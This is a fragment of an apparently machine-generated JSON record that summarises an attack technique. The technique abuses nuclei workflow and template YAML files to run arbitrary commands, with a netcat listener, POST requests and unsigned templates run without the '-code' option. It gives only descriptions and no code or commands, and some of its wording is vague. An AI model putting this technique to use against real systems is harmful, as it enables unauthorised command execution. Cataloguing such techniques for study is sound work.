In this case, users can execute arbitrary commands. (Although, as far as I know, most web applications use -t to execute)\n", "methods": ["Uses a workflow file to execute arbitrary commands.", "Exploits a feature in web applications that allows users to edit and execute workflow files.", "Uses a YAML file to define a workflow that executes a command.", "Uses the `nc` command to listen on a network port.", "Uses the `nuclei` tool to execute a workflow file and send a request to a web server.", "Uses a POST request to send a command to a web server.", "Uses a template to execute a command without the `-code` option and signature."]}
